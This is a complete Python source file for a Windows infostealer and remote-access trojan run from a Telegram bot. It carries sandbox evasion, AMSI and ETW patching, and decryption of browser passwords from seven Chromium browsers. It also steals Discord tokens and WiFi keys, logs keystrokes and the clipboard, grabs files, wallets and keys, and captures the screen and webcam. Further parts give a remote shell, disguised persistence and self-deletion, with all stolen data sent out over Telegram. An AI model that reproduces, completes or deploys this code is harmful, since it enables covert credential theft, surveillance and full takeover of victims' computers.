import os
import sys
import time
import random
import base64
import socket
import tempfile
import subprocess
import threading
import ctypes
import winreg
import platform
import re
from pathlib import Path

_KEY = 0x5A
def _d(s: str) -> str:
    return "".join(chr(b ^ _KEY) for b in base64.b64decode(s))

_TOKEN   = "PASTE_HERE"
_ADMIN   = "PASTE_HERE"
_API     = "PASTE_HERE"
_LOGIN   = "PASTE_HERE"
_DISCORD = "PASTE_HERE"

TOKEN = _d(_TOKEN)
ADMIN_ID = int(_d(_ADMIN))

import telebot
from telebot import types
from pynput import keyboard
import mss
import mss.tools
import cv2
import requests
import psutil
import sqlite3
import shutil

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

KEYLOG_BUFFER = []
KEYLOG_ACTIVE = False
CLIP_ACTIVE = False
listener = None
last_clip = ""

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def sandbox_check():
    try:
        if len(list(psutil.process_iter())) < 45:
            time.sleep(random.randint(300, 600))
            return True
    except:
        pass
    bad = ["vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample", "malware", "analysis", "cuckoo"]
    try:
        host = socket.gethostname().lower()
        user = os.getlogin().lower()
        if any(x in host or x in user for x in bad):
            time.sleep(random.randint(250, 500))
            return True
    except:
        pass
    try:
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 1.5 * 1024**3:
            time.sleep(random.randint(180, 400))
            return True
    except:
        pass
    time.sleep(random.randint(120, 280))
    return False

def patch_amsi_etw():
    try:
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        etw = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        if etw:
            old = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(etw, b"\xC3", 1)
            ctypes.windll.kernel32.VirtualProtect(etw, 1, old.value, ctypes.byref(old))
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if amsi:
            scan = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if scan:
                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(scan, 6, 0x40, ctypes.byref(old))
                ctypes.memmove(scan, b"\xB8\x57\x00\x07\x80\xC3", 6)
                ctypes.windll.kernel32.VirtualProtect(scan, 6, old.value, ctypes.byref(old))
    except:
        pass

def get_ip_geo():
    try:
        r = requests.get("http://ip-api.com/json/", timeout=6).json()
        return f"{r.get('query','?')} | {r.get('city','?')}, {r.get('country','?')}"
    except:
        return "unknown"

def sysinfo():
    uname = platform.uname()
    return (
        f"<b>Host:</b> {socket.gethostname()}\n"
        f"<b>User:</b> {os.getlogin()}\n"
        f"<b>OS:</b> {uname.system} {uname.release}\n"
        f"<b>CPU:</b> {platform.processor()}\n"
        f"<b>RAM:</b> {round(psutil.virtual_memory().total / 1024**3, 1)} GB\n"
        f"<b>IP/Geo:</b> {get_ip_geo()}\n"
        f"<b>Path:</b> {os.path.abspath(sys.argv[0])}"
    )

def decrypt_dpapi(encrypted):
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode(errors="ignore")
    except:
        return ""

def steal_chromium(name, base_path):
    results = []
    login_db = os.path.join(base_path, "Default", _d(_LOGIN))
    if not os.path.exists(login_db):
        return results
    tmp = os.path.join(tempfile.gettempdir(), f"t{random.randint(10000,99999)}.db")
    try:
        shutil.copy2(login_db, tmp)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc in cur.fetchall():
            if user or enc:
                pwd = decrypt_dpapi(enc)
                if pwd or user:
                    results.append(f"{url} | {user} | {pwd}")
        conn.close()
    except:
        pass
    finally:
        try: os.remove(tmp)
        except: pass
    return results

def steal_all_passwords():
    local = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(local, "Vivaldi", "User Data"),
        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
    }
    out = []
    for name, path in browsers.items():
        creds = steal_chromium(name, path)
        if creds:
            out.append(f"=== {name} ===\n" + "\n".join(creds))
    return "\n\n".join(out) if out else "empty"

def steal_discord_tokens():
    base = os.environ.get("APPDATA", "")
    paths = [
        os.path.join(base, _d(_DISCORD), "Local Storage", "leveldb"),
        os.path.join(base, "discordcanary", "Local Storage", "leveldb"),
        os.path.join(base, "discordptb", "Local Storage", "leveldb"),
        os.path.join(base, "discorddevelopment", "Local Storage", "leveldb"),
    ]
    tokens = set()
    for p in paths:
        if not os.path.isdir(p):
            continue
        for f in os.listdir(p):
            if f.endswith((".ldb", ".log")):
                try:
                    data = open(os.path.join(p, f), "r", errors="ignore").read()
                    for match in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', data):
                        tokens.add(match)
                except:
                    pass
    return "\n".join(tokens) if tokens else "empty"

def steal_wifi():
    try:
        out = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=0x08000000).decode(errors="ignore")
        res = []
        for line in out.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                try:
                    det = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, creationflags=0x08000000).decode(errors="ignore")
                    for l in det.splitlines():
                        if "Key Content" in l:
                            res.append(f"{name} : {l.split(':')[-1].strip()}")
                except:
                    pass
        return "\n".join(res) if res else "empty"
    except Exception as e:
        return str(e)

def grab_interesting_files():
    exts = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".wallet", ".key", ".kdbx", ".rdp", ".json", ".pem", ".ppk", ".ovpn"}
    targets = [Path.home()/"Desktop", Path.home()/"Documents", Path.home()/"Downloads"]
    found = []
    for folder in targets:
        if folder.exists():
            for f in folder.rglob("*"):
                if f.is_file() and f.suffix.lower() in exts and 50 < f.stat().st_size < 20_000_000:
                    found.append(str(f))
                    if len(found) >= 40:
                        return found
    return found

def on_press(key):
    global KEYLOG_BUFFER
    try:
        KEYLOG_BUFFER.append(key.char)
    except AttributeError:
        KEYLOG_BUFFER.append(f"[{str(key).replace('Key.', '')}]")

def start_keylogger():
    global listener, KEYLOG_ACTIVE
    if KEYLOG_ACTIVE:
        return
    KEYLOG_ACTIVE = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    global listener, KEYLOG_ACTIVE, KEYLOG_BUFFER
    if listener:
        try: listener.stop()
        except: pass
    KEYLOG_ACTIVE = False
    data = "".join(KEYLOG_BUFFER)
    KEYLOG_BUFFER.clear()
    return data

def clipboard_worker():
    global last_clip, CLIP_ACTIVE
    while CLIP_ACTIVE:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data and data != last_clip and len(str(data)) > 5:
                last_clip = data
                bot.send_message(ADMIN_ID, f"<b>Clipboard:</b>\n<code>{str(data)[:3000]}</code>")
        except:
            pass
        time.sleep(4)

def start_clip():
    global CLIP_ACTIVE
    if not CLIP_ACTIVE:
        CLIP_ACTIVE = True
        threading.Thread(target=clipboard_worker, daemon=True).start()

def stop_clip():
    global CLIP_ACTIVE
    CLIP_ACTIVE = False

def persist():
    exe = os.path.abspath(sys.argv[0])
    res = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SecurityHealthSystray", 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
        res.append("Run OK")
    except Exception as e:
        res.append(f"Run fail: {e}")
    try:
        startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        shutil.copy2(exe, startup / "RuntimeBroker.exe")
        res.append("Startup OK")
    except Exception as e:
        res.append(f"Startup fail: {e}")
    return " | ".join(res)

def self_destruct():
    try:
        bat = os.path.join(tempfile.gettempdir(), f"c{random.randint(10000,99999)}.bat")
        with open(bat, "w") as f:
            f.write(f'@echo off\ntimeout /t 3 /nobreak >nul\ndel /f /q "{os.path.abspath(sys.argv[0])}"\ndel /f /q "%~f0"\n')
        subprocess.Popen(bat, shell=True, creationflags=0x08000000)
    except:
        pass
    sys.exit(0)

def take_screenshot():
    path = os.path.join(tempfile.gettempdir(), f"s{random.randint(10000,99999)}.png")
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])
        mss.tools.to_png(img.rgb, img.size, output=path)
    return path

def take_webcam():
    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cam.isOpened():
        return None
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    path = os.path.join(tempfile.gettempdir(), f"c{random.randint(10000,99999)}.jpg")
    cv2.imwrite(path, frame)
    return path

def show_msg(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Windows Security", 0x40)

def main_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("Info", "Screen", "Cam")
    kb.row("KL ON", "KL OFF", "Dump KL")
    kb.row("Passwords", "Discord", "WiFi")
    kb.row("Clip ON", "Clip OFF", "Grab")
    kb.row("Shell", "Download", "Upload")
    kb.row("Msg", "Persist", "Kill")
    return kb

@bot.message_handler(commands=["start", "help"])
def start_handler(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.send_message(msg.chat.id, "ready", reply_markup=main_kb())

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID)
def cmd_handler(msg):
    text = (msg.text or "").strip()
    chat = msg.chat.id
    if text == "Info":
        bot.send_message(chat, sysinfo())
    elif text == "Screen":
        p = take_screenshot()
        bot.send_photo(chat, open(p, "rb"))
        try: os.remove(p)
        except: pass
    elif text == "Cam":
        p = take_webcam()
        if p:
            bot.send_photo(chat, open(p, "rb"))
            try: os.remove(p)
            except: pass
        else:
            bot.send_message(chat, "no cam")
    elif text == "KL ON":
        start_keylogger()
        bot.send_message(chat, "KL on")
    elif text == "KL OFF":
        stop_keylogger()
        bot.send_message(chat, "KL off")
    elif text == "Dump KL":
        data = stop_keylogger()
        if data:
            if len(data) > 3500:
                p = os.path.join(tempfile.gettempdir(), "k.txt")
                open(p, "w", encoding="utf-8").write(data)
                bot.send_document(chat, open(p, "rb"))
                try: os.remove(p)
                except: pass
            else:
                bot.send_message(chat, f"<code>{data}</code>")
        else:
            bot.send_message(chat, "empty")
    elif text == "Passwords":
        bot.send_message(chat, "collecting passwords...")
        data = steal_all_passwords()
        if len(data) > 3500:
            p = os.path.join(tempfile.gettempdir(), "p.txt")
            open(p, "w", encoding="utf-8").write(data)
            bot.send_document(chat, open(p, "rb"))
            try: os.remove(p)
            except: pass
        else:
            bot.send_message(chat, f"<code>{data}</code>")
    elif text == "Discord":
        bot.send_message(chat, f"<code>{steal_discord_tokens()}</code>")
    elif text == "WiFi":
        bot.send_message(chat, f"<code>{steal_wifi()}</code>")
    elif text == "Clip ON":
        start_clip()
        bot.send_message(chat, "clip on")
    elif text == "Clip OFF":
        stop_clip()
        bot.send_message(chat, "clip off")
    elif text == "Grab":
        files = grab_interesting_files()
        bot.send_message(chat, f"found {len(files)}")
        for f in files[:20]:
            try:
                bot.send_document(chat, open(f, "rb"), caption=os.path.basename(f))
            except:
                pass
            time.sleep(1)
    elif text == "Shell":
        bot.send_message(chat, "cmd:")
        bot.register_next_step_handler(msg, do_shell)
    elif text == "Download":
        bot.send_message(chat, "path:")
        bot.register_next_step_handler(msg, do_download)
    elif text == "Upload":
        bot.send_message(chat, "send file")
        bot.register_next_step_handler(msg, do_upload)
    elif text == "Msg":
        bot.send_message(chat, "text:")
        bot.register_next_step_handler(msg, do_msg)
    elif text == "Persist":
        bot.send_message(chat, persist())
    elif text == "Kill":
        bot.send_message(chat, "bye")
        time.sleep(1)
        self_destruct()

def do_shell(msg):
    if msg.from_user.id != ADMIN_ID: return
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        out = subprocess.check_output(msg.text, shell=True, stderr=subprocess.STDOUT, timeout=60, startupinfo=si, creationflags=0x08000000)
        bot.send_message(msg.chat.id, f"<code>{out.decode(errors='ignore')[:4000]}</code>")
    except Exception as e:
        bot.send_message(msg.chat.id, str(e))

def do_download(msg):
    if msg.from_user.id != ADMIN_ID: return
    path = msg.text.strip().strip('"')
    if os.path.isfile(path):
        bot.send_document(msg.chat.id, open(path, "rb"))
    else:
        bot.send_message(msg.chat.id, "not found")

def do_upload(msg):
    if msg.from_user.id != ADMIN_ID: return
    if not msg.document:
        bot.send_message(msg.chat.id, "not file")
        return
    info = bot.get_file(msg.document.file_id)
    data = bot.download_file(info.file_path)
    path = os.path.join(tempfile.gettempdir(), msg.document.file_name)
    with open(path, "wb") as f:
        f.write(data)
    bot.send_message(msg.chat.id, f"saved: {path}")

def do_msg(msg):
    if msg.from_user.id != ADMIN_ID: return
    show_msg(msg.text)
    bot.send_message(msg.chat.id, "shown")

if __name__ == "__main__":
    hide_console()
    sandbox_check()
    patch_amsi_etw()
    try:
        info = sysinfo()
        caps = (
            "Capabilities:\n"
            "- System info + geo\n"
            "- Screenshot / Webcam\n"
            "- Keylogger (ON/OFF/Dump)\n"
            "- Passwords (Chrome/Edge/Brave/Opera/Vivaldi/Yandex)\n"
            "- Discord tokens\n"
            "- WiFi passwords\n"
            "- Clipboard monitor\n"
            "- File grabber (docs/wallets/keys)\n"
            "- Remote shell\n"
            "- Download / Upload\n"
            "- Message box\n"
            "- Persistence (Run + Startup)\n"
            "- Self-destruct"
        )
        bot.send_message(ADMIN_ID, f"online\n{info}\n\n{caps}", reply_markup=main_kb())
    except:
        pass
    bot.infinity_polling(timeout=90, long_polling_timeout=90, interval=7)
